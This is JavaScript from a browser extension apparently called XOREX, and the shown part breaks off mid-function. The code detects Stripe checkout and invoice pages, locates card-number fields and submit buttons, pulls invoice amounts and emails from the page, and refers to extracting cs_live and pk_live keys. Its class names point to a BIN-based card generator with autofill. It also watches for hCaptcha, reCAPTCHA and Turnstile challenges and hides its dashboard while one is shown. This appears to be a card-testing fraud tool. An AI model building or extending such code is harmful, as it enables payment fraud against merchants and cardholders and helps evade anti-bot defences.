
(function() {
  'use strict';

  var K = window.XOREXKeys || {};

  let isDashboardActive = false;

  const REQUIRED_MODULES = {
    'storage.js': () => window.__XOREX_STORAGE_LOADED === true && typeof window.XOREXStorage !== 'undefined',
    'autofill.js': () => window.__XOREX_AUTOFILL_LOADED === true && typeof window.XOREXAutofill !== 'undefined'
  };

  function verifyModules() {
    const missingModules = [];
    const loadedModules = [];

    for (const [moduleName, checkFn] of Object.entries(REQUIRED_MODULES)) {
      try {
        if (checkFn()) {
          loadedModules.push(moduleName);
        } else {
          missingModules.push(moduleName);
        }
      } catch (e) {
        missingModules.push(moduleName);
      }
    }

    return { missingModules, loadedModules };
  }

  function showMissingFilesError(missingModules) {
    const existing = document.getElementById('xorex-file-error-overlay');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.id = 'xorex-file-error-overlay';
    overlay.className = 'xorex-error-overlay';

    const content = document.createElement('div');
    content.className = 'xorex-error-content';

    const header = document.createElement('div');
    header.className = 'xorex-error-header';
    header.textContent = '⚠️ XOREX - File Error';

    const body = document.createElement('div');
    body.className = 'xorex-error-body';

    const msg = document.createElement('p');
    msg.className = 'xorex-error-msg';
    msg.textContent = 'Extension files are missing or corrupted. Please reinstall the extension.';

    const missingBox = document.createElement('div');
    missingBox.className = 'xorex-error-missing';

    const missingTitle = document.createElement('div');
    missingTitle.className = 'xorex-error-title';
    missingTitle.textContent = 'Missing Files:';
    missingBox.appendChild(missingTitle);

    missingModules.forEach(m => {
      const item = document.createElement('div');
      item.className = 'xorex-error-item';
      item.innerHTML = '<span class="xorex-error-x">✗</span> ' + m;
      missingBox.appendChild(item);
    });

    const fixBox = document.createElement('div');
    fixBox.className = 'xorex-error-fix';

    const fixTitle = document.createElement('div');
    fixTitle.className = 'xorex-error-title xorex-error-title-green';
    fixTitle.textContent = 'How to fix:';
    fixBox.appendChild(fixTitle);

    const fixList = document.createElement('ol');
    fixList.className = 'xorex-error-list';
    ['Remove the current extension', 'Download the latest XOREX package', 'Load the extension again in Chrome'].forEach(step => {
      const li = document.createElement('li');
      li.textContent = step;
      fixList.appendChild(li);
    });
    fixBox.appendChild(fixList);

    body.appendChild(msg);
    body.appendChild(missingBox);
    body.appendChild(fixBox);
    content.appendChild(header);
    content.appendChild(body);
    overlay.appendChild(content);

    document.body.appendChild(overlay);
  }

  const { missingModules, loadedModules } = verifyModules();

  if (missingModules.length > 0) {
    if (document.body) {
      showMissingFilesError(missingModules);
    } else {
      document.addEventListener('DOMContentLoaded', () => showMissingFilesError(missingModules));
    }
    window.__XOREXBlocked = true;
    return;
  }

  window.__XOREXVerified = true;
})();

if (window.__XOREXBlocked) {
} else if (window.__XOREXLoaded) {
} else {
  window.__XOREXLoaded = true
  var K = window.XOREXKeys || {};
  let isDashboardActive = false;
  let isCaptchaVisible = false;
  let isRestoringAfterCaptcha = false;
  let wasAutoHiddenByCaptcha = false;
  let dashboardStateBeforeCaptcha = null;
    const excludedClasses = [
    'card-generator-overlay', 'xorex-page-watermark', 'success-toast',
    'success-toast-content', 'success-toast-text', 'success-toast-title',
    'success-toast-details', 'success-ripple-container', 'success-ripple-ring',
    'success-check', 'warning-toast', 'card-toast', 'cc-modal', 'bin-input-row',
    'panel-header', 'panel-body', 'panel-title', 'update-screen',
    'color-ball', 'section', 'section-divider',
    'action-btn', 'primary-btn', 'collapsible-section', 'collapsible-header',
    'collapsible-content', 'mode-toggle', 'mode-option', 'header-controls',
    'panel-header-content', 'minimize-btn', 'music-toggle'
  ];
  const excludedContainerSelectors = [
    '.card-generator-overlay', '.xorex-page-watermark', '.success-toast',
    '.success-toast-content', '.success-toast-text',
    '.warning-toast', '.card-toast', '.cc-modal',
    '.color-ball-container', '.section',
    '.section-divider', '.collapsible-section',
        '[class*="hcaptcha"]', '[class*="h-captcha"]', '[class*="captcha"]',
    '[class*="Captcha"]', '[class*="challenge"]', '[class*="Challenge"]',
    '[class*="modal"]', '[class*="Modal"]', '[class*="overlay"]', '[class*="Overlay"]',
    '[role="dialog"]', '[role="alertdialog"]',
        '[class*="PaymentMethod"]', '[class*="payment-method"]', '[class*="paymentMethod"]',
    '[class*="PaymentOptions"]', '[class*="payment-options"]',
    '[class*="WalletOptions"]', '[class*="wallet-options"]',
    '[role="radiogroup"]', '[role="tablist"]'
  ];
  function isExcludedElement(el) {
    if (!el || !el.classList) return false;
        if (el.closest && el.closest('.card-generator-overlay')) return true;
        if (el.closest && el.closest('.success-toast')) return true;
        if (el.closest && el.closest('.warning-toast')) return true;
        if (el.closest && el.closest('.card-toast')) return true;
        if (el.closest && el.closest('.cc-modal')) return true;
        if (el.closest && (
      el.closest('[data-hcaptcha]') ||
      el.closest('[class*="hcaptcha"]') ||
      el.closest('[class*="h-captcha"]') ||
      el.closest('[id*="hcaptcha"]') ||
      el.closest('[id*="h-captcha"]') ||
      el.closest('iframe[src*="hcaptcha"]') ||
      el.closest('[class*="captcha"]') ||
      el.closest('[class*="Captcha"]') ||
      el.closest('[class*="challenge"]') ||
      el.closest('[class*="Challenge"]')
    )) return true;
        for (const cls of excludedClasses) {
      if (el.classList.contains(cls)) return true;
    }
    if (el.id && el.id.includes('xorex')) return true;
    if (el.id && (el.id.includes('hcaptcha') || el.id.includes('captcha'))) return true;
        if (el.closest) {
      for (const selector of excludedContainerSelectors) {
        if (el.closest(selector)) return true;
      }
    }
    return false;
  }
  function addSmoothTransition(el) {
    try {
      const currentTransition = el.style.transition || '';
      if (!currentTransition.includes('background')) {
        el.style.transition = currentTransition ?
          currentTransition + ', background-color 0.3s ease' :
          'background-color 0.3s ease';
      }
    } catch (e) {}
  }
  function removeSmoothTransition(el) {
    try {
      setTimeout(() => {
        const currentTransition = el.style.transition || '';
        el.style.transition = currentTransition.replace(/,?\s*background-color\s*[\d.]*s?\s*ease/g, '').trim();
      }, 350);
    } catch (e) {}
  }
  function checkCaptchaVisible() {
    try {

      const captchaIframes = document.querySelectorAll(
        'iframe[src*="hcaptcha"], iframe[src*="captcha"], iframe[src*="challenge"], ' +
        'iframe[data-hcaptcha], iframe[title*="hCaptcha"], iframe[title*="captcha"], ' +
        'iframe[title*="challenge"], iframe[title*="verification"], ' +
        'iframe[src*="recaptcha"], iframe[src*="turnstile"], iframe[src*="arkoselabs"]'
      );
      for (const iframe of captchaIframes) {
        try {
          const rect = iframe.getBoundingClientRect();
          const style = window.getComputedStyle(iframe);
          if (rect.width > 0 && rect.height > 0 &&
              style.display !== 'none' && style.visibility !== 'hidden' &&
              style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }

      const captchaContainers = document.querySelectorAll(
        '[class*="hcaptcha"], [class*="h-captcha"], [id*="hcaptcha"], [id*="h-captcha"], ' +
        '[data-hcaptcha], [class*="captcha-container"], [class*="captcha-overlay"], ' +
        '[class*="challenge-container"], [class*="ChallengeContainer"], ' +
        '[class*="recaptcha"], [class*="turnstile"], [class*="cf-turnstile"], ' +
        '[class*="captcha-modal"], [class*="CaptchaModal"], [class*="captcha_modal"], ' +
        '[class*="verification-modal"], [class*="VerificationModal"]'
      );
      for (const container of captchaContainers) {
        try {
          const rect = container.getBoundingClientRect();
          const style = window.getComputedStyle(container);
          if (rect.width > 50 && rect.height > 50 &&
              style.display !== 'none' && style.visibility !== 'hidden' &&
              style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }

      const fullScreenOverlays = document.querySelectorAll(
        '[class*="challenge-overlay"], [class*="Challenge-overlay"], ' +
        '[class*="security-challenge"], [class*="SecurityChallenge"]'
      );
      for (const overlay of fullScreenOverlays) {
        try {
          const rect = overlay.getBoundingClientRect();
          const style = window.getComputedStyle(overlay);
          if (rect.width > window.innerWidth * 0.5 && rect.height > window.innerHeight * 0.3 &&
              style.display !== 'none' && style.visibility !== 'hidden' &&
              style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }
      return false;
    } catch (e) {
      return false;
    }
  }
    const preserveOriginalSelectors = [
        '[class*="BrandIcon"]', '[class*="CardBrand"]', '[class*="brand-icon"]',
        '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]', '.Button--primary',
    '[data-testid="hosted-payment-submit-button"]',
        '[class*="cvc"]', '[class*="Cvc"]', '[class*="cvv"]', '[class*="SecurityCode"]',
        '[class*="Link"]', '[class*="link-button"]', '[class*="LinkButton"]',
        '[class*="PaymentMethod"]', '[class*="payment-method"]', '[class*="paymentMethod"]',
    '[class*="Tab"]', '[class*="tab"]', 'button[role="tab"]',
    '[class*="Radio"]', '[class*="radio"]', 'input[type="radio"]',
    '[class*="Wallet"]', '[class*="wallet"]',
        '[class*="Icon"]', '[class*="icon"]', '[class*="Logo"]', '[class*="logo"]',
    'svg', '[role="img"]',
        'input', 'select', '.Input', '[class*="Input"]',
        'footer', '.Footer', '[class*="Footer"]', '[class*="footer"]',
        'iframe',
    '[class*="FormFieldGroup"]', '[class*="form-field"]', '[class*="FormField"]',
    '[class*="CheckoutForm"]', '[class*="checkout-form"]', '[class*="PaymentForm"]',
    '[class*="ContactInformation"]', '[class*="contact-information"]',
    '[class*="BillingAddress"]', '[class*="billing-address"]',
    '[class*="ShippingAddress"]', '[class*="shipping-address"]',
    '[class*="CardElement"]', '[class*="card-element"]',
    '[class*="ElementsApp"]', '[class*="elements-app"]',
    '[class*="CheckoutPaymentForm"]', '[class*="PaymentMethodSelector"]',
    '[class*="AccordionItem"]', '[class*="accordion"]',
    '[class*="Fieldset"]', '[class*="fieldset"]',
    '[class*="FormRow"]', '[class*="form-row"]',
    '[class*="TextField"]', '[class*="text-field"]',
    '[class*="SelectField"]', '[class*="select-field"]',
    '[class*="Checkbox"]', '[class*="checkbox"]',
    'label', '[class*="Label"]',
    '[class*="TermsText"]', '[class*="terms"]',
    '[class*="ReadOnlyFormField"]', '[class*="read-only"]',
    '[class*="SavedPaymentMethod"]', '[class*="saved-payment"]'
  ];
  function isDesktop() {
    return window.innerWidth > 768;
  }

  function getDeviceType() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    const hasTouch = 'ontouchstart' in window ||
                     navigator.maxTouchPoints > 0 ||
                     navigator.msMaxTouchPoints > 0;

    const hasCoarsePointer = window.matchMedia && window.matchMedia('(pointer: coarse)').matches;

    const canHover = window.matchMedia && window.matchMedia('(hover: hover)').matches;

    const uaIsiOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
    const uaIsAndroid = /android/i.test(userAgent);
    const uaIsMobile = /Mobi|Mobile|webOS|BlackBerry|Opera Mini|IEMobile/i.test(userAgent);

    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const devicePixelRatio = window.devicePixelRatio || 1;
    const smallScreen = Math.min(screenWidth, screenHeight) <= 768;

    const hasOrientationType = screen.orientation && screen.orientation.type;

    if (uaIsiOS) {
      return 'ios';
    }

    if (hasTouch && hasCoarsePointer && !canHover) {
      if (uaIsAndroid) {
        return /mobile/i.test(userAgent) ? 'android_phone' : 'android_tablet';
      }
      return 'mobile';
    }

    if (hasTouch && smallScreen && devicePixelRatio >= 2) {
      if (uaIsAndroid) {
        return 'android_phone';
      }
      return 'mobile';
    }

    if (hasTouch && hasCoarsePointer) {
      return 'mobile';
    }

    if (uaIsAndroid) {
      return /mobile/i.test(userAgent) ? 'android_phone' : 'android_tablet';
    }

    if (uaIsMobile) {
      return 'mobile';
    }

    if (hasTouch && smallScreen) {
      return 'mobile';
    }

    return 'desktop';
  }

  function isMobileDevice() {
    const deviceType = getDeviceType();
    return ['ios', 'android_phone', 'android_tablet', 'mobile'].includes(deviceType);
  }

  function isIOSDevice() {
    const userAgent = navigator.userAgent || '';
    return /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
  }

  function isDesktopDevice() {
    return getDeviceType() === 'desktop';
  }

  function isTouchDevice() {
    return 'ontouchstart' in window ||
           navigator.maxTouchPoints > 0 ||
           navigator.msMaxTouchPoints > 0;
  }

  function shouldApplyBackgroundColor() {
    return isMobileDevice() || (isTouchDevice() && window.matchMedia('(pointer: coarse)').matches);
  }

  const desktopPreserveSelectors = [
    '[class*="RightPanel"]', '[class*="right-panel"]', '[class*="rightPanel"]',
    '[class*="FormContainer"]', '[class*="form-container"]',
    '[class*="PaymentElement"]', '[class*="payment-element"]',
    '[class*="CheckoutRightColumn"]', '[class*="checkout-right"]',
    '[class*="OrderForm"]', '[class*="order-form"]',
    '[class*="CheckoutContent"]', '[class*="checkout-content"]',
    '[class*="MainContent"]', '[class*="main-content"]',
    '[class*="FormSection"]', '[class*="form-section"]',
    '[class*="CheckoutMain"]', '[class*="checkout-main"]',
    '[class*="PaymentSection"]', '[class*="payment-section"]',
    '[class*="ContactSection"]', '[class*="contact-section"]',
    '[class*="App-Payment"]', '[class*="app-payment"]',
    '[class*="StripeElement"]', '[class*="stripe-element"]'
  ];
  function shouldPreserveElement(el) {
    if (!el) return false;
    for (const selector of preserveOriginalSelectors) {
      try {
        if (el.matches && el.matches(selector)) return true;
        if (el.closest && el.closest(selector)) return true;
      } catch (e) {}
    }
    if (isDesktop()) {
      for (const selector of desktopPreserveSelectors) {
        try {
          if (el.matches && el.matches(selector)) return true;
          if (el.closest && el.closest(selector)) return true;
        } catch (e) {}
      }
    }
    return false;
  }

  const RANDOM_BG_COLORS = [
    "#0d9488", "#0f766e", "#115e59", "#134e4a", "#14b8a6",
    "#0e7490", "#155e75", "#164e63", "#047857", "#065f46"
  ];

  const DEFAULT_BG_COLOR = "#0f766e";
  let pageBackgroundColor = DEFAULT_BG_COLOR;
  let bgColorEnabled = false;
  let hasCustomColor = false;
  let sessionRandomColor = null;

  function getRandomBgColor() {
    const randomIndex = Math.floor(Math.random() * RANDOM_BG_COLORS.length);
    return RANDOM_BG_COLORS[randomIndex];
  }

  function loadBgColorSetting() {
    return new Promise((resolve) => {
      const savedEnabled = localStorage.getItem(K.BG_ENABLED);
      const savedColor = localStorage.getItem(K.PAGE_BG_COLOR);
      const savedHasCustom = localStorage.getItem(K.PAGE_HAS_CUSTOM);

      bgColorEnabled = savedEnabled === "true";
      hasCustomColor = savedHasCustom === "true";

      if (hasCustomColor && savedColor) {

        pageBackgroundColor = savedColor;
      } else if (bgColorEnabled) {

        sessionRandomColor = getRandomBgColor();
        pageBackgroundColor = sessionRandomColor;
      }
      resolve();
    });
  }

  function saveBgColorSetting(enabled, color, isCustom = false) {
    bgColorEnabled = enabled;
    hasCustomColor = isCustom;

    localStorage.setItem(K.BG_ENABLED, enabled ? "true" : "false");
    localStorage.setItem(K.PAGE_HAS_CUSTOM, isCustom ? "true" : "false");

    if (isCustom) {
      pageBackgroundColor = color;
      localStorage.setItem(K.PAGE_BG_COLOR, color);
    }

    var bgData = {};
    bgData[K.BG_ENABLED] = enabled;
    bgData[K.PAGE_BG_COLOR] = isCustom ? color : "";
    bgData[K.PAGE_HAS_CUSTOM] = isCustom;
    window.postMessage({
      type: 'XOREX_STORAGE_REQUEST',
      requestId: 'bg_' + Date.now(),
      action: 'SET',
      data: bgData
    }, '*');
  }

  loadBgColorSetting().then(() => {
    if (bgColorEnabled && typeof applyCustomStyles === 'function') {
      applyCustomStyles();
    }
  });

  function isInPaymentFormArea(el) {
    if (!el) return false;
    const paymentFormSelectors = [
      '[class*="RightPanelContent"]', '[class*="rightPanelContent"]',
      '[class*="App-Payment"]', '[class*="PaymentFormContainer"]',
      '[class*="CheckoutPaymentForm"]', '[class*="PaymentMethodForm"]',
      '[class*="FormFieldGroup"]', '[class*="ContactInformation"]',
      '[class*="BillingAddressForm"]', '[class*="PaymentElement"]',
      '[class*="ElementsApp"]', '[class*="StripeElement"]',
      '[class*="CheckoutForm"]', '[class*="PaymentRequestButton"]',
      '[class*="AccordionItemContent"]', '[class*="FormRow"]',
      '[data-testid*="payment"]', '[data-testid*="checkout"]',
      '[class*="Column--right"]', '[class*="column-right"]',
      '[class*="RightColumn"]', '[class*="right-column"]'
    ];
    for (const selector of paymentFormSelectors) {
      try {
        if (el.closest && el.closest(selector)) return true;
      } catch (e) {}
    }
    if (isDesktop()) {
      try {
        const rect = el.getBoundingClientRect();
        const screenMidpoint = window.innerWidth / 2;
        if (rect.left > screenMidpoint - 100) {
          const computed = window.getComputedStyle(el);
          const bg = computed.backgroundColor;
          if (bg && (bg.includes('255, 255, 255') || bg.includes('250, 250, 250') || bg.includes('248, 248, 248') || bg.includes('245, 245, 245'))) {
            return true;
          }
        }
      } catch (e) {}
    }
    return false;
  }
  let _bgStyleTag = null;
  let _lastAppliedBgColor = null;
  let _bgProcessed = new WeakSet();
  let _bgRafId = null;

  function _ensureBgStyleTag(bgColor) {
    if (_lastAppliedBgColor !== bgColor) {
      _lastAppliedBgColor = bgColor;
      document.documentElement.style.setProperty('background', bgColor, 'important');
      document.documentElement.style.setProperty('background-color', bgColor, 'important');
      document.documentElement.style.setProperty('min-height', '100vh', 'important');
      if (document.body) {
        document.body.style.setProperty('background', bgColor, 'important');
        document.body.style.setProperty('background-color', bgColor, 'important');
        document.body.style.setProperty('min-height', '100vh', 'important');
      }
    }
  }

  function _setBg(el, bgColor) {
    if (_bgProcessed.has(el)) return;
    el.style.setProperty('background', bgColor, 'important');
    el.style.setProperty('background-color', bgColor, 'important');
    _bgProcessed.add(el);
  }

  function applyCustomStyles() {

    if (!bgColorEnabled) {
      return;
    }

    if (!shouldApplyBackgroundColor()) {
      return;
    }

    isCaptchaVisible = checkCaptchaVisible();
    if (isCaptchaVisible) {
      return;
    }

    let bgColor;
    if (hasCustomColor) {
      bgColor = pageBackgroundColor;
    } else {

      if (!sessionRandomColor) {
        sessionRandomColor = getRandomBgColor();
      }
      bgColor = sessionRandomColor;
    }

    if (_lastAppliedBgColor !== bgColor) {
      _bgProcessed = new WeakSet();
    }

    _ensureBgStyleTag(bgColor);

    const onDesktop = isDesktop();

    const allSelectors = onDesktop
      ? '[class*="LeftPanel"], [class*="left-panel"], [class*="leftPanel"], [class*="Column--left"], [class*="LeftColumn"], [class*="ProductSummary"], [class*="OrderSummary"], [class*="product-summary"], [class*="App"], [class*="Page"], [class*="Root"], [class*="Shell"], section, main, article, header, aside, nav, .Divider, [class*="divider"], [class*="Divider"], [class*="ViewDetails"], [class*="details"], [class*="Details"], [class*="OrderDetails"], [class*="order-details"], [class*="Summary"], [class*="summary"], [class*="PaymentDetails"], [class*="payment-details"], [class*="LineItem"], [class*="line-item"], [class*="OrderSummary"], [class*="order-summary"], [class*="ProductDetails"], [class*="product-details"]'
      : '[class*="App"], [class*="app"], [class*="Page"], [class*="page"], [class*="Container"], [class*="container"], [class*="Wrapper"], [class*="wrapper"], [class*="Layout"], [class*="layout"], [class*="Content"], [class*="content"], [class*="Main"], [class*="Body"], [class*="body"], [class*="Root"], [class*="root"], [class*="Shell"], [class*="shell"], [class*="Frame"], [class*="frame"], [class*="View"], [class*="view"], [class*="Panel"], [class*="panel"], [class*="Section"], [class*="section"], [class*="Block"], [class*="block"], [class*="Region"], [class*="region"], [class*="Area"], [class*="area"], [class*="Zone"], [class*="zone"], [class*="Checkout"], [class*="checkout"], [class*="Payment"], [class*="Stripe"], [class*="stripe"], section, main, article, header, aside, nav, .Divider, [class*="divider"], [class*="Divider"], [class*="ViewDetails"], [class*="details"], [class*="Details"], [class*="OrderDetails"], [class*="order-details"], [class*="Summary"], [class*="summary"], [class*="PaymentDetails"], [class*="payment-details"], [class*="LineItem"], [class*="line-item"], [class*="OrderSummary"], [class*="order-summary"], [class*="ProductDetails"], [class*="product-details"]';

    document.querySelectorAll(allSelectors).forEach(el => {
      if (!isExcludedElement(el) && !shouldPreserveElement(el) && (!onDesktop || !isInPaymentFormArea(el))) {
        _setBg(el, bgColor);
      }
    });

    if (onDesktop) {
      const divs = document.getElementsByTagName('div');
      for (let i = 0, len = divs.length; i < len; i++) {
        const el = divs[i];
        if (_bgProcessed.has(el)) continue;
        if (isExcludedElement(el) || shouldPreserveElement(el) || isInPaymentFormArea(el)) continue;
        const classes = el.className || '';
        if (typeof classes === 'string' && (classes.includes('Left') || classes.includes('left') || classes.includes('Product') || classes.includes('product') || classes.includes('Order') || classes.includes('order') || classes.includes('Summary') || classes.includes('summary'))) {
          _setBg(el, bgColor);
        }
      }
    } else {
      const divs = document.getElementsByTagName('div');
      for (let i = 0, len = divs.length; i < len; i++) {
        const el = divs[i];
        if (_bgProcessed.has(el)) continue;
        if (isExcludedElement(el) || shouldPreserveElement(el)) continue;
        _setBg(el, bgColor);
      }
    }

    if (!onDesktop) {
      if (_bgRafId) cancelAnimationFrame(_bgRafId);
      _bgRafId = requestAnimationFrame(() => {
        const tags = ['span', 'p', 'li', 'ul', 'ol', 'dl', 'table', 'tr', 'td', 'th', 'form', 'fieldset', 'figure', 'figcaption', 'footer'];
        for (let t = 0; t < tags.length; t++) {
          const els = document.getElementsByTagName(tags[t]);
          for (let i = 0, len = els.length; i < len; i++) {
            const el = els[i];
            if (_bgProcessed.has(el)) continue;
            if (isExcludedElement(el) || shouldPreserveElement(el)) continue;
            _setBg(el, bgColor);
          }
        }
        _bgRafId = null;
      });
    }
  }

  let lastCaptchaState = false;
  setInterval(() => {
    if (!isDashboardActive) return;

    const currentCaptchaVisible = checkCaptchaVisible();

    if (currentCaptchaVisible !== lastCaptchaState) {
      lastCaptchaState = currentCaptchaVisible;
      isCaptchaVisible = currentCaptchaVisible;

      if (currentCaptchaVisible) {

        if (typeof autoHideDashboardForCaptcha === 'function') {
          autoHideDashboardForCaptcha();
        }
      } else {

        if (typeof restoreDashboardAfterCaptcha === 'function') {
          restoreDashboardAfterCaptcha();
        }
      }
    }

    if (!bgColorEnabled) return;
    if (isCaptchaVisible) {
      return;
    }
    const expectedBg = pageBackgroundColor || DEFAULT_BG_COLOR;
    const bodyBg = window.getComputedStyle(document.body).backgroundColor;
    const htmlBg = window.getComputedStyle(document.documentElement).backgroundColor;
        if (bodyBg === 'rgba(0, 0, 0, 0)' || bodyBg === 'transparent' ||
        htmlBg === 'rgba(0, 0, 0, 0)' || htmlBg === 'transparent' ||
        bodyBg.includes('255, 255, 255') || htmlBg.includes('255, 255, 255')) {
      applyCustomStyles();
    }
  }, 300);
    let styleTimeout = null;
  let isApplyingStyles = false;
  function debouncedApplyStyles() {
    if (!isDashboardActive) return;
    if (!bgColorEnabled) return;
    if (isApplyingStyles) return;
    if (isCaptchaVisible) return;
    if (styleTimeout) clearTimeout(styleTimeout);
    styleTimeout = setTimeout(() => {
      if (!isDashboardActive) return;
      if (checkCaptchaVisible()) {
        isCaptchaVisible = true;
        return;
      }
      isApplyingStyles = true;
      applyCustomStyles();
      isApplyingStyles = false;
    }, 50);   }
    const styleObserver = new MutationObserver((mutations) => {
        const captchaAdded = mutations.some(m => {
      return Array.from(m.addedNodes).some(node => {
        if (node.nodeType === 1) {           return node.matches && (
            node.matches('[class*="hcaptcha"]') ||
            node.matches('[id*="hcaptcha"]') ||
            node.matches('[data-hcaptcha]') ||
            node.matches('iframe[src*="hcaptcha"]') ||
            node.matches('iframe[src*="captcha"]') ||
            node.matches('[class*="captcha"]') ||
            node.matches('[class*="challenge"]') ||
            node.matches('[class*="Challenge"]') ||
            node.matches('iframe[title*="captcha" i]') ||
            node.matches('iframe[title*="challenge" i]')
          );
        }
        return false;
      });
    });
        if (captchaAdded) {
      isCaptchaVisible = true;

      if (typeof autoHideDashboardForCaptcha === 'function') {
        autoHideDashboardForCaptcha();
      }
      return;
          }
        const captchaRemoved = mutations.some(m => {
            return Array.from(m.removedNodes).some(node => {
        if (node.nodeType === 1) {           return node.matches && (
            node.matches('[class*="hcaptcha"]') ||
            node.matches('[id*="hcaptcha"]') ||
            node.matches('[data-hcaptcha]') ||
            node.matches('iframe[src*="hcaptcha"]') ||
            node.matches('iframe[src*="captcha"]') ||
            node.matches('[class*="captcha"]') ||
            node.matches('[class*="challenge"]') ||
            node.matches('[class*="Challenge"]') ||
            node.matches('[role="dialog"]')
          );
        }
        return false;
      });
    });
        if (captchaRemoved) {
      setTimeout(() => {
        isCaptchaVisible = checkCaptchaVisible();
        if (!isCaptchaVisible) {
          isRestoringAfterCaptcha = true;
          applyCustomStyles();

          if (typeof restoreDashboardAfterCaptcha === 'function') {
            restoreDashboardAfterCaptcha();
          }
          setTimeout(() => {
            isRestoringAfterCaptcha = false;
          }, 400);
        }
      }, 500);
      return;
    }
        const hasRelevantChanges = mutations.some(m =>
      m.type === 'childList' && m.addedNodes.length > 0
    );
    if (hasRelevantChanges && !isCaptchaVisible) {
      debouncedApplyStyles();
    }
  });
  styleObserver.observe(document.body, { childList: true, subtree: true });
  const CARD_FIELD_SELECTORS = [
    '#cardNumber',
    '[name="cardNumber"]',
    '[name="card-number"]',
    '[name="cardnumber"]',
    '[autocomplete="cc-number"]',
    '[data-elements-stable-field-name="cardNumber"]',
    'input[placeholder*="card number" i]',
    'input[placeholder*="card no" i]',
    'input[aria-label*="card number" i]',
    '#card-number',
    '.card-number',
    '[name="number"]',
    '[name="ccnumber"]',
    '[name="cc-number"]',
    '[data-stripe="number"]',
    'input[name*="cardNumber" i]',
    'input[name*="card_number" i]',
    'input[name*="creditcard" i]',
    'input[id*="cardNumber" i]',
    'input[id*="card-number" i]',
    'input[id*="cc-number" i]'
  ];
  const SUBMIT_BUTTON_SELECTORS = [
    '.SubmitButton',
    '[class*="SubmitButton"]',
    '.SubmitButton-IconContainer',
    '.Button--primary',
    'button[type="submit"]',
    '[data-testid="hosted-payment-submit-button"]',
    '.pay-button',
    '.payment-button',
    'button[class*="pay" i]',
    'button[class*="submit" i]'
  ];
  function hasCardFields() {
    for (const selector of CARD_FIELD_SELECTORS) {
      try {
        const element = document.querySelector(selector);
        if (element) return true;
      } catch (e) {}
    }
    const iframes = document.querySelectorAll('iframe');
    for (const iframe of iframes) {
      try {
        const src = iframe.src || '';
        const name = iframe.name || '';
        const id = iframe.id || '';
        if (src.includes('stripe') || name.includes('card') || id.includes('card') ||
            src.includes('checkout') || src.includes('payment')) {
          return true;
        }
      } catch (e) {}
    }
    return false;
  }
  function hasSubmitButton() {
    for (const selector of SUBMIT_BUTTON_SELECTORS) {
      try {
        const element = document.querySelector(selector);
        if (element) return true;
      } catch (e) {}
    }
    return false;
  }
  function hasStripeSessionInUrl() {
    const url = window.location.href;
    const hostname = window.location.hostname.toLowerCase();
    const pathname = window.location.pathname.toLowerCase();

    const isStripeDomain = hostname.includes('stripe.com') ||
                           hostname.includes('checkout.') ||
                           hostname.includes('pay.') ||
                           hostname.includes('billing.') ||
                           hostname.includes('invoice.') ||
                           hostname.includes('buy.');

    if (!isStripeDomain) {
      return false;
    }

    if (url.includes('cs_live_') || url.includes('cs_test_')) return true;
    if (pathname.includes('/checkout/session/')) return true;
    if (pathname.includes('/checkout') && isStripeDomain) return true;
    if (url.includes('checkout.stripe.com/c/pay')) return true;
    if (hostname === 'buy.stripe.com') return true;

    return false;
  }
  function hasValidStripeKeys() {
    const csLive = extractCsLive(window.location.href);
    const pkLive = extractPkLive();
    return !!(csLive && pkLive);
  }
  function isInvoiceStripePage() {
    const url = window.location.href;
    return url.includes('invoice.stripe.com') || url.includes('/invoice/');
  }

  let invoiceData = null;

  function extractInvoiceData() {
    if (invoiceData) return invoiceData;

    try {
      const scripts = document.querySelectorAll('script');
      for (const script of scripts) {
        const content = script.textContent || '';

        if (content.includes('"object":"invoice"') || content.includes('"amount_due"')) {
          const jsonMatch = content.match(/\{[\s\S]*"object"\s*:\s*"invoice"[\s\S]*\}/);
          if (jsonMatch) {
            try {
              const data = JSON.parse(jsonMatch[0]);
              if (data.object === 'invoice') {
                invoiceData = {
                  amount: data.amount_due || data.total || 0,
                  currency: data.currency || 'usd',
                  email: data.customer_email || data.customer?.email || '',
                  productName: '',
                  businessUrl: '',
                  voided: data.voided === true
                };

                if (data.lines?.data?.[0]) {
                  const lineItem = data.lines.data[0];
                  invoiceData.productName = lineItem.hosted_invoice_product_name || lineItem.description || '';
                }

                if (data.business_url) {
                  invoiceData.businessUrl = data.business_url;
                }

                return invoiceData;
              }
            } catch (e) {}
          }
        }
      }

      if (window.__STRIPE_INVOICE__) {
        const data = window.__STRIPE_INVOICE__;
        invoiceData = {
          amount: data.amount_due || data.total || 0,
          currency: data.currency || 'usd',
          email: data.customer_email || '',
          productName: data.lines?.data?.[0]?.hosted_invoice_product_name || '',
          businessUrl: data.business_url || '',
          voided: data.voided === true
        };
        return invoiceData;
      }

      const pageText = document.body?.innerText || '';

      const emailMatch = pageText.match(/[\w.-]+@[\w.-]+\.\w+/);

      const amountMatch = pageText.match(/[₩$€£¥]\s*[\d,]+\.?\d*/);

      if (emailMatch || amountMatch) {
        invoiceData = {
            amount: amountMatch ? amountMatch[0] : '0',
          currency: '',
          email: emailMatch ? emailMatch[0] : '',
          productName: '',
          businessUrl: '',
          voided: false
        };
      }

    } catch (e) {
    }

    return invoiceData;
  }

  function isInvoiceVoided() {
    const data = extractInvoiceData();
    return data?.voided === true;
  }

  function getInvoiceDisplayName() {
    const data = extractInvoiceData();
    if (!data) return '';
    return data.businessUrl || data.productName || '';
  }

  function getInvoiceAmount() {
    const data = extractInvoiceData();
    if (!data) return '';

    const amount = data.amount;
    const currency = data.currency?.toUpperCase() || '';

    if (typeof amount === 'number') {
      const noDecimalCurrencies = ['KRW', 'JPY', 'VND'];
      if (noDecimalCurrencies.includes(currency)) {
        return `${amount.toLocaleString()} ${currency}`;
      }
      return `${(amount / 100).toFixed(2)} ${currency}`;
    }
    return amount || '0';
  }

  function getInvoiceEmail() {
    const data = extractInvoiceData();
    return data?.email || '';
  }

  function isBuyStripePage() {
    const hostname = window.location.hostname.toLowerCase();
    return hostname === 'buy.stripe.com' || hostname.endsWith('.buy.stripe.com');
  }

  function isPaymentPage() {

    if (isBuyStripePage()) {
